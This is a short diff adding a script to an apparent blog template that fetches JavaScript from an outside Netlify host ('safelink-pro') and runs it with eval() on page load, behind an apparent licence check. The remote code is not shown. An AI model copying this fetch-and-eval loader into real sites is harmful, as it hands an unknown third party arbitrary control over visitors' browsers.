@@ -1,0 +1,25 @@
+<script>//<![CDATA[
+
+const feedUrl = "/feeds/posts/default?alt=json&max-results=1000";
+const links = [];
+
+fetch('https://safelink-pro.netlify.app/.netlify/functions/serveJsFile')
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Unauthorized website');
+    }
+    return response.text();
+  })
+  .then(jsCode => {
+    try {
+      // Execute the fetched JavaScript code
+      eval(jsCode);
+    } catch (error) {
+      // Handle or log the error as needed
+      console.error('Error executing code:', error);
+    }
+  })
+  .catch(error => {
+    console.error('Unauthorized website access.');
+  });
+//]]></script>
